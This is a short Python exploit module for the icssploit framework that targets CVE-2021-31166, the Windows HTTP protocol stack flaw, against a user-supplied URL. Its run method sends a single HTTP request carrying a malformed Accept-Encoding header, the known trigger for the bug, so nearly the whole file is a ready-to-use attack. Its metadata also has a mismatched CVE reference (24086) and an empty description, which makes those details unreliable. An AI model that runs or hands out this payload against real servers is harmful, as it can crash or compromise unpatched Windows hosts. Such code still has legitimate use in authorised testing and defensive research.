from icssploit import (
    exploits,
    mute,
    validators,
)
import requests

class Exploit(exploits.Exploit):
    """ Exploit implementation for """
    __info__ = {
        'name': 'CVE-2021-31166 HTTP Protocol Stack Remote Code Execution Vulnerability',
        'authors': [
            'Microsoft Corporation',  # vulnerability discovery
            'Axel 0vercl0k Souchet', # original attack PoC
            'Sherry Li <sherryli-101[at]163.com>',  # icssploit module
        ],
        'description': '',
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24086',
        ],
        'devices': [
            'Windows10 Version 20H2'
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
        
    def run(self):
        '''Trigger CVE-2021-31166'''
        r = requests.get(self.target, headers = {
            'Accept-Encoding': 'doar-e, ftw, imo, ,',
        })
        print(r)


    @mute
    def check(self):
        pass
